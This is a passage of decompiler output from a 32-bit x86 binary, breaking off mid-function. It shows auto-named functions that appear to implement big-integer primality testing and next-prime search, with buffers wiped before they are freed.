// 463390: using guessed type _DWORD var_60[2];
// 463390: using guessed type _DWORD var_48[2];
// 463390: using guessed type _DWORD var_30[2];
// 463390: using guessed type _DWORD var_B4[2];
// 463390: using guessed type _DWORD var_E4[2];
// 463390: using guessed type _DWORD var_CC[2];

//----- (00463740) --------------------------------------------------------
char __cdecl sub_463740(_DWORD *a1)
{
  char v1; // bl
  unsigned int v2; // edx
  void *v3; // esi
  _DWORD v5[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v6; // [esp+18h] [ebp-1Ch]
  unsigned int v7; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v9; // [esp+30h] [ebp-4h]

  sub_43D500(v5, 2u);
  v9 = 0;
  v1 = sub_4645F0(a1, (int)v5);
  v2 = v7;
  v3 = Block;
  if ( v6 < v7 )
    v2 = v6;
  v9 = 1;
  memset(Block, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v3);
  else
    j_j___free_base(v3);
  return v1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 463740: using guessed type _DWORD var_24[2];

//----- (004637D0) --------------------------------------------------------
char __cdecl sub_4637D0(
        _DWORD *a1,
        _DWORD *a2,
        _DWORD *a3,
        _DWORD *a4,
        unsigned __int8 (__thiscall ***a5)(_DWORD, _DWORD *))
{
  unsigned int v5; // ebx
  int *v6; // eax
  char v7; // bl
  unsigned __int16 **v8; // eax
  unsigned __int16 *v9; // ecx
  int v10; // eax
  _DWORD *v11; // esi
  unsigned int v12; // edx
  void *v13; // eax
  int v14; // edx
  unsigned __int16 *v15; // esi
  unsigned __int16 *v16; // edi
  unsigned __int8 (__thiscall **v17)(_DWORD, _DWORD *); // eax
  unsigned int v18; // edx
  unsigned int v19; // edx
  unsigned int v20; // edx
  _DWORD *v21; // esi
  _DWORD *v22; // eax
  unsigned int v23; // edx
  void *v24; // esi
  void *v26; // [esp-4h] [ebp-C8h]
  void *v27; // [esp-4h] [ebp-C8h]
  void *v28; // [esp-4h] [ebp-C8h]
  void *v29; // [esp-4h] [ebp-C8h]
  _DWORD v30[24]; // [esp+10h] [ebp-B4h] BYREF
  _DWORD v31[6]; // [esp+70h] [ebp-54h] BYREF
  _DWORD v32[6]; // [esp+88h] [ebp-3Ch] BYREF
  _DWORD v33[2]; // [esp+A0h] [ebp-24h] BYREF
  unsigned int v34; // [esp+A8h] [ebp-1Ch]
  unsigned int v35; // [esp+ACh] [ebp-18h]
  void *v36; // [esp+B0h] [ebp-14h]
  int v37; // [esp+C0h] [ebp-4h]
  _DWORD v38[2]; // [esp+C4h] [ebp+0h] BYREF
  unsigned int v39; // [esp+CCh] [ebp+8h]
  unsigned int v40; // [esp+D0h] [ebp+Ch]
  void *v41; // [esp+D4h] [ebp+10h]
  _DWORD v42[2]; // [esp+DCh] [ebp+18h] BYREF
  unsigned int v43; // [esp+E4h] [ebp+20h]
  unsigned int v44; // [esp+E8h] [ebp+24h]
  void *v45; // [esp+ECh] [ebp+28h]
  _DWORD v46[2]; // [esp+F4h] [ebp+30h] BYREF
  unsigned int v47; // [esp+FCh] [ebp+38h]
  unsigned int v48; // [esp+100h] [ebp+3Ch]
  void *v49; // [esp+104h] [ebp+40h]
  unsigned int v50; // [esp+10Ch] [ebp+48h]
  unsigned __int16 *v51; // [esp+110h] [ebp+4Ch]
  void *Block; // [esp+114h] [ebp+50h]
  void *v53; // [esp+118h] [ebp+54h]
  bool v54; // [esp+11Fh] [ebp+5Bh]

  Block = 0;
  sub_441D00(v33, (int)a3);
  v5 = 8;
  v37 = 0;
  v6 = sub_443600();
  if ( sub_440F30(v33, (int)v6) )
  {
    if ( sub_440F30(a1, (int)v33) <= 0 && sub_440F30(v33, (int)a2) <= 0 && sub_463D10(v33) && (!a5 || (**a5)(a5, v33)) )
    {
      sub_43DBB0(a1, v33);
      v7 = 1;
      goto LABEL_67;
    }
LABEL_58:
    v7 = 0;
    goto LABEL_67;
  }
  v8 = (unsigned __int16 **)sub_465BB0();
  v9 = *v8;
  v10 = (char *)v8[1] - (char *)*v8;
  v51 = v9;
  v53 = (void *)(v10 >> 1);
  v50 = (unsigned int)&v9[v10 >> 1];
  sub_43D500(v42, *(unsigned __int16 *)(v50 - 2));
  v11 = a1;
  LOBYTE(v37) = 1;
  v54 = sub_440F30(a1, (int)v42) <= 0;
  v12 = v44;
  if ( v43 < v44 )
    v12 = v43;
  Block = v45;
  v26 = v45;
  LOBYTE(v37) = 2;
  memset(v45, 0, 4 * v12);
  if ( v12 )
    j_j_unknown_libname_61(v26);
  else
    j_j___free_base(v26);
  LOBYTE(v37) = 0;
  if ( v54 )
  {
    sub_43DEB0(a1);
    if ( a1[5] == 1 || sub_43DCE0(a1) )
    {
      v16 = v51;
    }
    else
    {
      v13 = (void *)sub_440FF0((int)a1);
      v14 = (int)v53;
      Block = v13;
      if ( (int)v53 > 0 )
      {
        v15 = v51;
        do
        {
          if ( (unsigned int)Block >= v15[v14 >> 1] )
          {
            v15 += (v14 >> 1) + 1;
            v14 += -1 - (v14 >> 1);
          }
          else
          {
            v14 >>= 1;
          }
        }
        while ( v14 > 0 );
        v51 = v15;
      }
      v16 = v51;
    }
    while ( 1 )
    {
      v53 = (void *)v5;
      if ( (unsigned int)v16 >= v50 )
        goto LABEL_30;
      sub_43D500(v46, *v16);
      LOBYTE(v37) = 3;
      Block = (void *)(v5 | 1);
      sub_4432F0(v46, v38, a4);
      v5 = (unsigned int)v53 | 0x13;
      v37 = 4;
      Block = (void *)((unsigned int)v53 | 0x13);
      if ( sub_440F30(v38, (int)a3)
        || a5 && (sub_43D500(v42, *v16), v17 = *a5, v5 |= 4u, v37 = 5, Block = (void *)v5, !(*v17)(a5, v42)) )
      {
        v54 = 1;
      }
      else
      {
LABEL_30:
        v54 = 0;
      }
      if ( (v5 & 4) != 0 )
      {
        v5 &= ~4u;
        Block = (void *)v5;
        v18 = v44;
        if ( v43 < v44 )
          v18 = v43;
        v53 = v45;
        v27 = v45;
        v37 = 6;
        memset(v45, 0, 4 * v18);
        if ( v18 )
          j_j_unknown_libname_61(v27);
        else
          j_j___free_base(v27);
      }
      if ( (v5 & 2) != 0 )
      {
        v5 &= ~2u;
        Block = (void *)v5;
        v19 = v40;
        if ( v39 < v40 )
          v19 = v39;
        v53 = v41;
        v28 = v41;
        v37 = 7;
        memset(v41, 0, 4 * v19);
        if ( v19 )
          j_j_unknown_libname_61(v28);
        else
          j_j___free_base(v28);
      }
      v37 = 0;
      if ( (v5 & 1) != 0 )
      {
        v5 &= ~1u;
        v20 = v48;
        if ( v47 < v48 )
          v20 = v47;
        v53 = v49;
        v29 = v49;
        LOBYTE(v37) = 8;
        memset(v49, 0, 4 * v20);
        if ( v20 )
          j_j_unknown_libname_61(v29);
        else
          j_j___free_base(v29);
        LOBYTE(v37) = 0;
      }
      if ( !v54 )
        break;
      v16 = ++v51;
    }
    v11 = a1;
    if ( (unsigned int)v51 < v50 )
    {
      sub_43D500(v46, *v51);
      LOBYTE(v37) = 9;
      sub_43DBB0(a1, v46);
      LOBYTE(v37) = 0;
      sub_4066A0((int)v46);
      v7 = sub_440F30(a1, (int)a2) <= 0;
      goto LABEL_67;
    }
    sub_43D500(v46, *(unsigned __int16 *)(v50 - 2) + 1);
    LOBYTE(v37) = 10;
    sub_43DBB0(a1, v46);
    LOBYTE(v37) = 0;
    sub_4066A0((int)v46);
  }
  if ( sub_4428B0(a4, 0) == 1 )
  {
    sub_43D500(v42, 1u);
    LOBYTE(v37) = 11;
    sub_43D500(v38, 2u);
    LOBYTE(v37) = 12;
    sub_43D500(v46, 1u);
    LOBYTE(v37) = 13;
    v21 = sub_463090(v31, 1u);
    LOBYTE(v37) = 14;
    v22 = sub_463210(v32, (int)a3, a4, v46, v38, v42);
    LOBYTE(v37) = 15;
    v7 = sub_4637D0(a1, a2, v22, v21, a5);
    sub_4066A0((int)v32);
    sub_4066A0((int)v31);
    sub_4066A0((int)v46);
    sub_4066A0((int)v38);
    sub_4066A0((int)v42);
    goto LABEL_67;
  }
  sub_4431A0(a3, v38, (int)v11);
  LOBYTE(v37) = 16;
  sub_4432F0(v38, v46, a4);
  LOBYTE(v37) = 17;
  sub_43E3C0((int)v11, (int)v46);
  sub_4066A0((int)v46);
  LOBYTE(v37) = 0;
  sub_4066A0((int)v38);
  if ( sub_440F30(v11, (int)a2) > 0 )
    goto LABEL_58;
  sub_462E00(v30, v11, a2, a4, 0);
  LOBYTE(v37) = 18;
  if ( sub_465640(v30, v11) )
  {
    while ( a5 && !(**a5)(a5, v11) || !sub_463740(v11) || !sub_463D10(v11) )
    {
      if ( !sub_465640(v30, v11) )
        goto LABEL_65;
    }
    v7 = 1;
  }
  else
  {
LABEL_65:
    v7 = 0;
  }
  sub_462F60(v30);
LABEL_67:
  v23 = v35;
  v24 = v36;
  if ( v34 < v35 )
    v23 = v34;
  v37 = 19;
  memset(v36, 0, 4 * v23);
  if ( v23 )
    j_j_unknown_libname_61(v24);
  else
    j_j___free_base(v24);
  return v7;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4637D0: using guessed type _DWORD var_80[2];
// 4637D0: using guessed type _DWORD var_44[2];
// 4637D0: using guessed type _DWORD var_2C[2];
// 4637D0: using guessed type _DWORD var_5C[2];
// 4637D0: using guessed type _DWORD var_B0[6];
// 4637D0: using guessed type _DWORD var_98[6];
// 4637D0: using guessed type _DWORD var_110[24];

//----- (00463D10) --------------------------------------------------------
bool __cdecl sub_463D10(_DWORD *a1)
{
  unsigned int v1; // edx
  void *v2; // esi
  int v3; // eax
  int v4; // edi
  unsigned __int16 *v5; // ebx
  int v6; // esi
  int v7; // eax
  unsigned int v8; // edx
  unsigned __int16 v9; // dx
  unsigned __int16 *v10; // edi
  int v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  bool v15; // bl
  void *v16; // [esp-4h] [ebp-58h]
  _DWORD v17[6]; // [esp+10h] [ebp-44h] BYREF
  _DWORD v18[2]; // [esp+28h] [ebp-2Ch] BYREF
  unsigned int v19; // [esp+30h] [ebp-24h]
  unsigned int v20; // [esp+34h] [ebp-20h]
  void *Block; // [esp+38h] [ebp-1Ch]
  void *v22; // [esp+40h] [ebp-14h]
  bool v23; // [esp+47h] [ebp-Dh]
  int v24; // [esp+50h] [ebp-4h]

  v22 = 0;
  sub_43D500(v18, 0x7FCFu);
  v24 = 0;
  v23 = sub_440F30(a1, (int)v18) <= 0;
  v1 = v20;
  v2 = Block;
  if ( v19 < v20 )
    v1 = v19;
  v24 = 1;
  memset(Block, 0, 4 * v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
  v24 = -1;
  if ( v23 )
  {
    v3 = sub_465BB0();
    v4 = (int)a1;
    v5 = *(unsigned __int16 **)v3;
    v6 = (*(_DWORD *)(v3 + 4) - *(_DWORD *)v3) >> 1;
    if ( a1[5] == 1
      || sub_43DCE0(a1)
      || (sub_43D500(v18, v5[v6 - 1]), v24 = 2, v22 = (void *)2, v7 = sub_440F30(a1, (int)v18), v23 = 1, v7 > 0) )
    {
      v23 = 0;
    }
    v24 = -1;
    if ( ((unsigned __int8)v22 & 2) != 0 )
    {
      v8 = v20;
      if ( v19 < v20 )
        v8 = v19;
      v22 = Block;
      v16 = Block;
      v24 = 3;
      memset(Block, 0, 4 * v8);
      if ( v8 )
        j_j_unknown_libname_61(v16);
      else
        j_j___free_base(v16);
      v4 = (int)a1;
      v24 = -1;
    }
    if ( !v23 )
      return 0;
    v9 = sub_440FF0(v4);
    v10 = &v5[v6];
    while ( v6 > 0 )
    {
      if ( v5[v6 >> 1] >= v9 )
      {
        v6 >>= 1;
      }
      else
      {
        v5 += (v6 >> 1) + 1;
        v6 += -1 - (v6 >> 1);
      }
    }
    return v5 != v10 && v9 >= *v5;
  }
  else
  {
    v12 = sub_465DB0();
    if ( sub_440F30(a1, v12) > 0 )
    {
      v14 = (_DWORD *)sub_465BB0();
      v15 = 0;
      if ( !sub_4660A0(a1, *(unsigned __int16 *)(*v14 + 2 * ((v14[1] - *v14) >> 1) - 2)) )
      {
        sub_43D500(v17, 3u);
        v24 = 4;
        v22 = (void *)1;
        if ( sub_4645F0(a1, (int)v17) )
        {
          if ( sub_463F80(a1) )
            v15 = 1;
        }
      }
      if ( ((unsigned __int8)v22 & 1) != 0 )
        sub_4066A0((int)v17);
      return v15;
    }
    else
    {
      v13 = (_DWORD *)sub_465BB0();
      return sub_4660A0(a1, *(unsigned __int16 *)(*v13 + 2 * ((v13[1] - *v13) >> 1) - 2)) == 0;
    }
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 463D10: using guessed type _DWORD var_2C[2];
// 463D10: using guessed type _DWORD var_44[6];

//----- (00463F80) --------------------------------------------------------
bool __cdecl sub_463F80(_DWORD *a1)
{
  int v1; // ebx
  _DWORD *v2; // esi
  unsigned int v3; // edx
  bool v5; // bl
  unsigned int v6; // edx
  void *v7; // esi
  unsigned int v8; // edx
  void *v9; // esi
  unsigned int v10; // edx
  void *v11; // esi
  _DWORD *v12; // edi
  unsigned int i; // esi
  int v14; // ebx
  int v15; // eax
  unsigned int v16; // ebx
  unsigned int v17; // edx
  unsigned int v18; // edx
  unsigned int v19; // edx
  unsigned int v20; // edx
  unsigned int v21; // edx
  unsigned int v22; // edx
  unsigned int v23; // edx
  unsigned int v24; // edx
  void *v25; // esi
  unsigned int v26; // edx
  void *v27; // esi
  unsigned int v28; // edx
  void *v29; // esi
  unsigned int v30; // edx
  void *v31; // esi
  void *v32; // [esp-4h] [ebp-B0h]
  void *v33; // [esp-4h] [ebp-B0h]
  void *v34; // [esp-4h] [ebp-B0h]
  void *v35; // [esp-4h] [ebp-B0h]
  void *v36; // [esp-4h] [ebp-B0h]
  void *v37; // [esp-4h] [ebp-B0h]
  void *v38; // [esp-4h] [ebp-B0h]
  void *v39; // [esp-4h] [ebp-B0h]
  _DWORD v40[6]; // [esp+10h] [ebp-9Ch] BYREF
  _DWORD v41[2]; // [esp+28h] [ebp-84h] BYREF
  unsigned int v42; // [esp+30h] [ebp-7Ch]
  unsigned int v43; // [esp+34h] [ebp-78h]
  void *v44; // [esp+38h] [ebp-74h]
  _DWORD v45[2]; // [esp+40h] [ebp-6Ch] BYREF
  unsigned int v46; // [esp+48h] [ebp-64h]
  unsigned int v47; // [esp+4Ch] [ebp-60h]
  void *v48; // [esp+50h] [ebp-5Ch]
  _DWORD v49[2]; // [esp+58h] [ebp-54h] BYREF
  unsigned int v50; // [esp+60h] [ebp-4Ch]
  unsigned int v51; // [esp+64h] [ebp-48h]
  void *v52; // [esp+68h] [ebp-44h]
  _DWORD v53[2]; // [esp+70h] [ebp-3Ch] BYREF
  unsigned int v54; // [esp+78h] [ebp-34h]
  unsigned int v55; // [esp+7Ch] [ebp-30h]
  void *v56; // [esp+80h] [ebp-2Ch]
  _DWORD v57[2]; // [esp+88h] [ebp-24h] BYREF
  unsigned int v58; // [esp+90h] [ebp-1Ch]
  unsigned int v59; // [esp+94h] [ebp-18h]
  void *v60; // [esp+98h] [ebp-14h]
  int v61; // [esp+A8h] [ebp-4h]
  _DWORD v62[2]; // [esp+ACh] [ebp+0h] BYREF
  unsigned int v63; // [esp+B4h] [ebp+8h]
  unsigned int v64; // [esp+B8h] [ebp+Ch]
  void *v65; // [esp+BCh] [ebp+10h]
  _DWORD v66[2]; // [esp+C4h] [ebp+18h] BYREF
  unsigned int v67; // [esp+CCh] [ebp+20h]
  unsigned int v68; // [esp+D0h] [ebp+24h]
  void *v69; // [esp+D4h] [ebp+28h]
  _DWORD v70[2]; // [esp+DCh] [ebp+30h] BYREF
  unsigned int v71; // [esp+E4h] [ebp+38h]
  unsigned int v72; // [esp+E8h] [ebp+3Ch]
  void *v73; // [esp+ECh] [ebp+40h]
  _DWORD v74[2]; // [esp+F4h] [ebp+48h] BYREF
  unsigned int v75; // [esp+FCh] [ebp+50h]
  unsigned int v76; // [esp+100h] [ebp+54h]
  void *v77; // [esp+104h] [ebp+58h]
  int v78; // [esp+10Ch] [ebp+60h]
  void *Block; // [esp+110h] [ebp+64h]
  bool v80; // [esp+117h] [ebp+6Bh]

  v1 = 0;
  Block = 0;
  sub_43D500(v66, 1u);
  v2 = a1;
  v61 = 0;
  v80 = sub_440F30(a1, (int)v66) <= 0;
  v3 = v68;
  if ( v67 < v68 )
    v3 = v67;
  Block = v69;
  v32 = v69;
  v61 = 1;
  memset(v69, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v32);
  else
    j_j___free_base(v32);
  v61 = -1;
  if ( v80 )
    return 0;
  if ( sub_4428B0(a1, 0) )
  {
    sub_43D500(v53, 3u);
    v61 = 3;
    Block = 0;
    while ( 1 )
    {
      sub_43D500(v74, 4u);
      LOBYTE(v61) = 4;
      sub_44E440(v53, v57, (int)v53);
      LOBYTE(v61) = 5;
      sub_4431A0(v57, v66, (int)v74);
      v1 |= 0x18u;
      LOBYTE(v61) = 6;
      v78 = sub_464C40(v66, v2);
      v80 = v78 == 1;
      v6 = v68;
      v7 = v69;
      if ( v67 < v68 )
        v6 = v67;
      LOBYTE(v61) = 7;
      memset(v69, 0, 4 * v6);
      if ( v6 )
        j_j_unknown_libname_61(v7);
      else
        j_j___free_base(v7);
      v8 = v59;
      v9 = v60;
      if ( v58 < v59 )
        v8 = v58;
      LOBYTE(v61) = 8;
      memset(v60, 0, 4 * v8);
      if ( v8 )
        j_j_unknown_libname_61(v9);
      else
        j_j___free_base(v9);
      v10 = v76;
      v11 = v77;
      if ( v75 < v76 )
        v10 = v75;
      LOBYTE(v61) = 9;
      memset(v77, 0, 4 * v10);
      if ( v10 )
        j_j_unknown_libname_61(v11);
      else
        j_j___free_base(v11);
      LOBYTE(v61) = 3;
      if ( !v80 )
        break;
      Block = (char *)Block + 1;
      v2 = a1;
      if ( Block == (void *)64 && sub_442FD0(a1) )
        goto LABEL_31;
      sub_43DE00(v53);
      sub_43DE00(v53);
    }
    if ( !v78 )
    {
LABEL_31:
      v5 = 0;
      goto LABEL_98;
    }
    sub_43D500(v40, 1u);
    v12 = a1;
    LOBYTE(v61) = 10;
    sub_443C50(a1, v45, (int)v40);
    LOBYTE(v61) = 12;
    sub_4066A0((int)v40);
    for ( i = 0; !sub_4428B0(v45, i); ++i )
      ;
    sub_43DC30(v41, i);
    LOBYTE(v61) = 13;
    sub_464E40(v62, v41, v53, a1);
    LOBYTE(v61) = 14;
    sub_43D500(v74, 2u);
    LOBYTE(v61) = 15;
    v14 = v1 | 0x21;
    Block = (void *)v14;
    v78 = v14;
    if ( !sub_440F30(v62, (int)v74) )
      goto LABEL_36;
    sub_43D500(v70, 2u);
    v61 = 16;
    Block = (void *)(v14 | 2);
    sub_4431A0(a1, v49, (int)v70);
    v14 = v78 | 0x46;
    v61 = 17;
    Block = (void *)(v78 | 0x46);
    v15 = sub_440F30(v62, (int)v49);
    v80 = 0;
    if ( !v15 )
LABEL_36:
      v80 = 1;
    if ( (v14 & 4) != 0 )
    {
      v14 &= ~4u;
      sub_4066A0((int)v49);
    }
    if ( (v14 & 2) != 0 )
    {
      v14 &= ~2u;
      sub_4066A0((int)v70);
    }
    v61 = 14;
    v16 = v14 & 0xFFFFFFFE;
    sub_4066A0((int)v74);
    if ( !v80 )
    {
      v78 = 1;
      if ( i <= 1 )
      {
LABEL_81:
        v5 = 0;
        goto LABEL_83;
      }
      while ( 1 )
      {
        sub_43D500(v70, 2u);
        LOBYTE(v61) = 18;
        sub_44E440(v62, v66, (int)v62);
        LOBYTE(v61) = 19;
        sub_4431A0(v66, v57, (int)v70);
        LOBYTE(v61) = 20;
        sub_4432F0(v57, v74, v12);
        LOBYTE(v61) = 21;
        sub_43DBB0(v62, v74);
        v17 = v76;
        if ( v75 < v76 )
          v17 = v75;
        Block = v77;
        v33 = v77;
        LOBYTE(v61) = 22;
        memset(v77, 0, 4 * v17);
        if ( v17 )
          j_j_unknown_libname_61(v33);
        else
          j_j___free_base(v33);
        v18 = v59;
        if ( v58 < v59 )
          v18 = v58;
        Block = v60;
        v34 = v60;
        LOBYTE(v61) = 23;
        memset(v60, 0, 4 * v18);
        if ( v18 )
          j_j_unknown_libname_61(v34);
        else
          j_j___free_base(v34);
        v19 = v68;
        if ( v67 < v68 )
          v19 = v67;
        Block = v69;
        v35 = v69;
        LOBYTE(v61) = 24;
        memset(v69, 0, 4 * v19);
        if ( v19 )
          j_j_unknown_libname_61(v35);
        else
          j_j___free_base(v35);
        v20 = v72;
        if ( v71 < v72 )
          v20 = v71;
        Block = v73;
        v36 = v73;
        LOBYTE(v61) = 25;
        memset(v73, 0, 4 * v20);
        if ( v20 )
          j_j_unknown_libname_61(v36);
        else
          j_j___free_base(v36);
        LOBYTE(v61) = 14;
        sub_43D500(v74, 2u);
        LOBYTE(v61) = 26;
        sub_4431A0(a1, v70, (int)v74);
        v16 |= 0x780u;
        LOBYTE(v61) = 27;
        v80 = sub_440F30(v62, (int)v70) == 0;
        v21 = v72;
        if ( v71 < v72 )
          v21 = v71;
        Block = v73;
        v37 = v73;
        LOBYTE(v61) = 28;
        memset(v73, 0, 4 * v21);
        if ( v21 )
          j_j_unknown_libname_61(v37);
        else
          j_j___free_base(v37);
        v22 = v76;
        if ( v75 < v76 )
          v22 = v75;
        Block = v77;
        v38 = v77;
        LOBYTE(v61) = 29;
        memset(v77, 0, 4 * v22);
        if ( v22 )
          j_j_unknown_libname_61(v38);
        else
          j_j___free_base(v38);
        LOBYTE(v61) = 14;
        if ( v80 )
          break;
        sub_43D500(v49, 2u);
        LOBYTE(v61) = 30;
        v80 = sub_440F30(v62, (int)v49) == 0;
        v23 = v51;
        if ( v50 < v51 )
          v23 = v50;
        Block = v52;
        v39 = v52;
        LOBYTE(v61) = 31;
        memset(v52, 0, 4 * v23);
        if ( v23 )
          j_j_unknown_libname_61(v39);
        else
          j_j___free_base(v39);
        LOBYTE(v61) = 14;
        if ( !v80 )
        {
          v12 = a1;
          if ( ++v78 < i )
            continue;
        }
        goto LABEL_81;
      }
    }
    v5 = 1;
LABEL_83:
    v24 = v64;
    v25 = v65;
    if ( v63 < v64 )
      v24 = v63;
    LOBYTE(v61) = 32;
    memset(v65, 0, 4 * v24);
    if ( v24 )
      j_j_unknown_libname_61(v25);
    else
      j_j___free_base(v25);
    v26 = v43;
    v27 = v44;
    if ( v42 < v43 )
      v26 = v42;
    LOBYTE(v61) = 33;
    memset(v44, 0, 4 * v26);
    if ( v26 )
      j_j_unknown_libname_61(v27);
    else
      j_j___free_base(v27);
    v28 = v47;
    v29 = v48;
    if ( v46 < v47 )
      v28 = v46;
    LOBYTE(v61) = 34;
    memset(v48, 0, 4 * v28);
    if ( v28 )
      j_j_unknown_libname_61(v29);
    else
      j_j___free_base(v29);
LABEL_98:
    v30 = v55;
    v31 = v56;
    if ( v54 < v55 )
      v30 = v54;
    v61 = 35;
    memset(v56, 0, 4 * v30);
    if ( v30 )
      j_j_unknown_libname_61(v31);
    else
      j_j___free_base(v31);
    return v5;
  }
  sub_43D500(v70, 2u);
  v61 = 2;
  v5 = sub_440F30(a1, (int)v70) == 0;
  sub_4066A0((int)v70);
  return v5;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 463F80: using guessed type _DWORD var_54[2];
// 463F80: using guessed type _DWORD var_3C[2];
// 463F80: using guessed type _DWORD var_A8[2];
// 463F80: using guessed type _DWORD var_24[2];
// 463F80: using guessed type _DWORD var_90[2];
// 463F80: using guessed type _DWORD var_108[6];
// 463F80: using guessed type _DWORD var_D8[2];
// 463F80: using guessed type _DWORD var_F0[2];
// 463F80: using guessed type _DWORD var_6C[2];
// 463F80: using guessed type _DWORD var_C0[2];

//----- (004645F0) --------------------------------------------------------
char __cdecl sub_4645F0(_DWORD *a1, int a2)
{
  int v2; // ebx
  unsigned int v3; // edx
  char v4; // bl
  int v5; // eax
  int v7; // ebx
  int v8; // eax
  unsigned int i; // esi
  int v10; // ebx
  int v11; // eax
  unsigned int v12; // ebx
  unsigned int v13; // edx
  unsigned int v14; // edx
  void *v15; // esi
  unsigned int v16; // edx
  void *v17; // esi
  unsigned int v18; // edx
  void *v19; // esi
  unsigned int v20; // edx
  unsigned int v21; // edx
  unsigned int v22; // edx
  unsigned int v23; // edx
  void *v24; // esi
  unsigned int v25; // edx
  void *v26; // esi
  unsigned int v27; // edx
  void *v28; // esi
  unsigned int v29; // edx
  void *v30; // esi
  unsigned int v31; // edx
  void *v32; // esi
  unsigned int v33; // edx
  void *v34; // esi
  unsigned int v35; // edx
  void *v36; // esi
  void *v37; // [esp-4h] [ebp-68h]
  void *v38; // [esp-4h] [ebp-68h]
  void *v39; // [esp-4h] [ebp-68h]
  void *v40; // [esp-4h] [ebp-68h]
  void *v41; // [esp-4h] [ebp-68h]
  _DWORD v42[2]; // [esp+10h] [ebp-54h] BYREF
  unsigned int v43; // [esp+18h] [ebp-4Ch]
  unsigned int v44; // [esp+1Ch] [ebp-48h]
  void *v45; // [esp+20h] [ebp-44h]
  _DWORD v46[6]; // [esp+28h] [ebp-3Ch] BYREF
  _DWORD v47[2]; // [esp+40h] [ebp-24h] BYREF
  unsigned int v48; // [esp+48h] [ebp-1Ch]
  unsigned int v49; // [esp+4Ch] [ebp-18h]
  void *v50; // [esp+50h] [ebp-14h]
  int v51; // [esp+60h] [ebp-4h]
  _DWORD v52[2]; // [esp+64h] [ebp+0h] BYREF
  unsigned int v53; // [esp+6Ch] [ebp+8h]
  unsigned int v54; // [esp+70h] [ebp+Ch]
  void *v55; // [esp+74h] [ebp+10h]
  _DWORD v56[2]; // [esp+7Ch] [ebp+18h] BYREF
  unsigned int v57; // [esp+84h] [ebp+20h]
  unsigned int v58; // [esp+88h] [ebp+24h]
  void *v59; // [esp+8Ch] [ebp+28h]
  _DWORD v60[2]; // [esp+94h] [ebp+30h] BYREF
  unsigned int v61; // [esp+9Ch] [ebp+38h]
  unsigned int v62; // [esp+A0h] [ebp+3Ch]
  void *v63; // [esp+A4h] [ebp+40h]
  _DWORD v64[2]; // [esp+ACh] [ebp+48h] BYREF
  unsigned int v65; // [esp+B4h] [ebp+50h]
  unsigned int v66; // [esp+B8h] [ebp+54h]
  void *v67; // [esp+BCh] [ebp+58h]
  int v68; // [esp+C4h] [ebp+60h]
  void *Block; // [esp+C8h] [ebp+64h]
  bool v70; // [esp+CFh] [ebp+6Bh]

  v2 = 0;
  v68 = 0;
  sub_43D500(v64, 3u);
  v51 = 0;
  v70 = sub_440F30(a1, (int)v64) <= 0;
  v3 = v66;
  if ( v65 < v66 )
    v3 = v65;
  Block = v67;
  v37 = v67;
  v51 = 1;
  memset(v67, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v37);
  else
    j_j___free_base(v37);
  v51 = -1;
  if ( v70 )
  {
    sub_43D500(v64, 2u);
    v51 = 2;
    v4 = 1;
    v68 = 1;
    if ( !sub_440F30(a1, (int)v64)
      || (sub_43D500(v47, 3u), v51 = 3, v4 = 3, v68 = 3, v5 = sub_440F30(a1, (int)v47), v70 = 0, !v5) )
    {
      v70 = 1;
    }
    if ( (v4 & 2) != 0 )
      sub_4066A0((int)v47);
    sub_4066A0((int)v64);
    return v70;
  }
  if ( !sub_4428B0(a1, 0) )
  {
    sub_43D500(v46, 2u);
    v51 = 4;
    v2 = 4;
    v68 = 4;
    if ( sub_440F30(a1, (int)v46) )
      goto LABEL_16;
  }
  sub_43D500(v64, 1u);
  v51 = 5;
  v7 = v2 | 8;
  v68 = v7;
  sub_441D00(v47, a2);
  v51 = 6;
  v2 = v7 | 0x50;
  v68 = v2;
  v8 = sub_440F30(v47, (int)v64);
  v70 = 0;
  if ( v8 )
LABEL_16:
    v70 = 1;
  if ( (v2 & 0x10) != 0 )
  {
    v2 &= ~0x10u;
    sub_4066A0((int)v47);
  }
  if ( (v2 & 8) != 0 )
  {
    v2 &= ~8u;
    sub_4066A0((int)v64);
  }
  v51 = -1;
  if ( (v2 & 4) != 0 )
  {
    v2 &= ~4u;
    sub_4066A0((int)v46);
  }
  if ( v70 )
    return 0;
  sub_43D500(v46, 1u);
  v51 = 7;
  sub_4431A0(a1, v56, (int)v46);
  LOBYTE(v51) = 9;
  sub_4066A0((int)v46);
  for ( i = 0; !sub_4428B0(v56, i); ++i )
    ;
  sub_43DC30(v52, i);
  LOBYTE(v51) = 10;
  sub_44E580(v60, a2, (int)v52, a1);
  LOBYTE(v51) = 11;
  sub_43D500(v64, 1u);
  LOBYTE(v51) = 12;
  v10 = v2 | 0xA0;
  v68 = v10;
  if ( !sub_440F30(v60, (int)v64) || (v11 = sub_440F30(v60, (int)v56), v70 = 0, !v11) )
    v70 = 1;
  v51 = 11;
  v12 = v10 & 0xFFFFFFDF;
  v13 = v66;
  if ( v65 < v66 )
    v13 = v65;
  Block = v67;
  v38 = v67;
  LOBYTE(v51) = 13;
  memset(v67, 0, 4 * v13);
  if ( v13 )
    j_j_unknown_libname_61(v38);
  else
    j_j___free_base(v38);
  LOBYTE(v51) = 11;
  if ( !v70 )
  {
    v68 = 1;
    if ( i > 1 )
    {
      while ( 1 )
      {
        sub_44E440(v60, v47, (int)v60);
        LOBYTE(v51) = 17;
        sub_4432F0(v47, v64, a1);
        v12 |= 0x300u;
        LOBYTE(v51) = 18;
        sub_43DBB0(v60, v64);
        v20 = v66;
        if ( v65 < v66 )
          v20 = v65;
        Block = v67;
        v39 = v67;
        LOBYTE(v51) = 19;
        memset(v67, 0, 4 * v20);
        if ( v20 )
          j_j_unknown_libname_61(v39);
        else
          j_j___free_base(v39);
        v21 = v49;
